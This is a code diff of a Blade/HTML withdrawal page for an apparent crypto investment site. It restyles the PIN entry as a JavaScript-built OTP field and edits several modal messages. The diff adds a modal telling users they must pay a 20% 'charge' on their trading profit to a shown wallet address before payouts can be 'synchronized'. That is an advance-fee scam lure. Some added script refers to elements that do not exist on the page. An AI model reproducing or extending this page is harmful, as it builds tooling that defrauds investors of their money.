@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
     <head>
+    <link href="https://unpkg.com/tailwindcss@^1.0/dist/tailwind.min.css" rel="stylesheet">
         @include('layouts.meta')
         <?php 
             $page = "withdraw-transact.php"; 
@@ -265,25 +266,51 @@
             <input type="hidden" name="trn_sum_ref" value="{{$trn_sum_ref}}"/>
             <div class="row">
                 <br><br>
-                <div class="row px-5">
-                    <div class="col col-lg-3 col-xs-3 px-2">
-                        <input type="password" name="pin1" class="pin-input-cl" id="pin-1" />
-                    </div>
-                    <div class="col col-lg-3 col-xs-3 px-2">
-                        <input type="password" name="pin2" class="pin-input-cl" id="pin-2" />
-                    </div>
-                    <div class="col col-lg-3 col-xs-3 px-2">
-                        <input type="password" name="pin3" class="pin-input-cl" id="pin-3" />
-                    </div>
-                    <div class="col col-lg-3 col-xs-3 px-2">
-                        <input type="password" name="pin4" class="pin-input-cl" id="pin-4" />
-                    </div>
+                <div class="flex justify-center " id="OTPInput">
+                    
                 </div>
                 <span class="text-center" id="message-span"></span>
             </div>
           <br><br>
             <button type="submit" class="btn btn-primary" id="complete-pin-id">Okay</button>
         </form>
+    </div>
+  </div>
+</div>
+
+<!-- The Modal trigger account not verify -->
+<div class="modal" id="myModalSuccessProfit">
+  <div class="modal-dialog modal-lg modal-dialog-centered">
+    <div class="modal-content">
+
+      <!-- Modal Header -->
+      <!-- Modal body -->
+      <div class="modal-body text-center">
+      <div class="alert-box">
+        <i class="fas fa-exclamation-triangle mr-2 force-color-green"></i> 
+        <span style="font-size:12px;" class="force-color-green">TO LINK / SYNCHRONIZE YOUR PAYOUT WALLET ADDRESS FOR AUTOMATED PAYOUTS, YOU HAVE TO PAY 20%({{$trn_sum_pro}}USD) CHARGE ON YOUR TRADING PROFIT TO THIS WALLET ADDRESS.</span>
+      </div>
+      <br><br>
+      <div class="text-center">
+          <img src="{{ asset('img/payment-gateway') }}/{{$payment_id->upload_qr_img}}" class="backcode-size-img" />
+      </div>
+      <div class="text-center">
+          <div>
+              <br><br>
+              <span class="big-font-size text-left">Wallet address</span><br>
+              
+              <span>
+                  <input type="text" value="{{$payment_id->wallet_address}}" id="inputfield"  class="input-withd" readonly />
+              </span>
+          </div>
+      </div>
+      <br>
+      <div class="text-center">
+          <button type="button" onclick="getTextCopied()" id="buttontext" class="btn btn-outline-primary mr-2 mt-4">Copy address</button>
+          <button type="button" id="shareButton" class="btn btn-primary mt-4 display-none-area-desk">Share address</button>
+          <button type="submit" class="btn btn-primary" data-dismiss="modal">Okay</button>
+      </div>
+      </div>
     </div>
   </div>
 </div>
@@ -297,14 +324,15 @@
       <!-- Modal body -->
       <div class="modal-body text-center">
             <span class="force-color-green" style="font-size:50px;"><i class="far fa-check-circle"></i></span><br>
-            <span class="big-font-size">Pin Confirmed</span><br><br><br>
+            <span class="big-font-size">Successful!</span><br>
+            <span class="small-font-size text-center">Account balance withdrawal successful</span><br><br>
       </div>
     </div>
   </div>
 </div>
 
 <!-- The Modal trigger account not verify -->
-<div class="modal" id="statusErrorNoInvestPlan">
+<div class="modal" id="myModalNoInvestPlan">
   <div class="modal-dialog modal-sm modal-dialog-centered">
     <div class="modal-content">
 
@@ -331,7 +359,7 @@ Please opt in for an investment pack</span><br><br>
       <div class="modal-body text-center">
             <span class="force-color-red" style="font-size:50px;"><i class="far fa-window-close"></i></span><br>
             <span class="big-font-size">Unsuccessful</span><br>
-            <span class="small-font-size text-center">Input at least minimum deposit</span><br><br>
+            <span class="small-font-size text-center">Insufficient balance. Please fund your account to proceed.</span><br><br>
       </div>
     </div>
   </div>
@@ -380,7 +408,7 @@ Please opt in for an investment pack</span><br><br>
                     var total = Number(input_amt) + Number(charges);
                     var coin_amt = Number(total) / Number({{$payment_id->price}});
 
-                    document.querySelector('#amount-snt').value = total;
+                    document.querySelector('#amount-snt').value = input_amt;
                     document.querySelector('#charges-snt').value = charges;
                     document.querySelector('#coin_amount-snt').value = coin_amt;
 
@@ -397,7 +425,7 @@ Please opt in for an investment pack</span><br><br>
                     var total = Number(input_amt) + Number(charges);
                     var coin_amt = Number(total) / Number({{$payment_id->price}});
 
-                    document.querySelector('#amount-snt').value = total;
+                    document.querySelector('#amount-snt').value = input_amt;
                     document.querySelector('#charges-snt').value = charges;
                     document.querySelector('#coin_amount-snt').value = coin_amt;
                     
@@ -413,7 +441,7 @@ Please opt in for an investment pack</span><br><br>
             });
             
             $('#wallet-address-transact-input-m').change(function(){
-                document.querySelector('#wallet_address-m').value = $('#wallet-address-transact-input-m').val();
+                document.querySelector('#wallet_address').value = $('#wallet-address-transact-input-m').val();
             });
 
             $(document).on('click', '.withdraw_sour', function(){
@@ -421,7 +449,7 @@ Please opt in for an investment pack</span><br><br>
             });
             
             $(document).on('click', '.withdraw_sour-m', function(){
-                document.querySelector('#withdraw_source-m').value = $(this).attr("data-value");
+                document.querySelector('#withdraw_source').value = $(this).attr("data-value");
             });
 
             });
@@ -456,6 +484,94 @@ Please opt in for an investment pack</span><br><br>
                   $('#myModalSuccess').modal('show');
               });
           @endif
+          
+          @if(session('statusSuccessProfit'))
+              $(window).on('load', function() {
+                  $('#myModalSuccessProfit').modal('show');
+              });
+          @endif
+                    
       </script>
+      <script>
+            function getTextCopied() {
+              // body...
+              var inputfield=document.getElementById('inputfield');
+
+              inputfield.select();
+              inputfield.setSelectionRange(0,999999);
+
+              document.execCommand("copy");
+              document.getElementById('buttontext').innerHTML="Copied";
+             }
+        </script>
+
+<script>
+    /* This creates all the OTP input fields dynamically. Change the otp_length variable  to change the OTP Length */
+const $otp_length = 4;
+
+const element = document.getElementById('OTPInput');
+for (let i = 0; i < $otp_length; i++) {
+  let inputField = document.createElement('input'); // Creates a new input element
+  inputField.className = "w-12 h-12 bg-gray-100 border-gray-100 outline-none focus:bg-gray-200 m-2 text-center rounded focus:border-blue-400 focus:shadow-outline";
+  // Do individual OTP input styling here;
+  inputField.style.cssText = "color: transparent; text-shadow: 0 0 0 gray;"; // Input field text styling. This css hides the text caret
+  inputField.id = 'otp-field' + i; // Don't remove
+  inputField.name = 'pin' + i; // Don't remove
+  inputField.maxLength = 1; // Sets individual field length to 1 char
+  element.appendChild(inputField); // Adds the input field to the parent div (OTPInput)
+}
+
+/*  This is for switching back and forth the input box for user experience */
+const inputs = document.querySelectorAll('#OTPInput > *[id]');
+for (let i = 0; i < inputs.length; i++) {
+  inputs[i].addEventListener('keydown', function(event) {
+    if (event.key === "Backspace") {
+
+      if (inputs[i].value == '') {
+        if (i != 0) {
+          inputs[i - 1].focus();
+        }
+      } else {
+        inputs[i].value = '';
+      }
+
+    } else if (event.key === "ArrowLeft" && i !== 0) {
+      inputs[i - 1].focus();
+    } else if (event.key === "ArrowRight" && i !== inputs.length - 1) {
+      inputs[i + 1].focus();
+    } else if (event.key != "ArrowLeft" && event.key != "ArrowRight") {
+      inputs[i].setAttribute("type", "text");
+      inputs[i].value = ''; // Bug Fix: allow user to change a random otp digit after pressing it
+      setTimeout(function() {
+        inputs[i].setAttribute("type", "password");
+      }, 1000); // Hides the text after 1 sec
+    }
+  });
+  inputs[i].addEventListener('input', function() {
+    inputs[i].value = inputs[i].value.toUpperCase(); // Converts to Upper case. Remove .toUpperCase() if conversion isnt required.
+    if (i === inputs.length - 1 && inputs[i].value !== '') {
+      return true;
+    } else if (inputs[i].value !== '') {
+      inputs[i + 1].focus();
+    }
+  });
+
+}
+/*  This is to get the value on pressing the submit button
+  *   In this example, I used a hidden input box to store the otp after compiling data from each input fields
+  *   This hidden input will have a name attribute and all other single character fields won't have a name attribute
+  *   This is to ensure that only this hidden input field will be submitted when you submit the form */
+
+document.getElementById('otpSubmit').addEventListener("click", function() {
+  const inputs = document.querySelectorAll('#OTPInput > *[id]');
+  let compiledOtp = '';
+  for (let i = 0; i < inputs.length; i++) {
+    compiledOtp += inputs[i].value;
+  }
+  document.getElementById('otp').value = compiledOtp;
+  return true;
+});
+</script>
+        
     </body>
 </html>
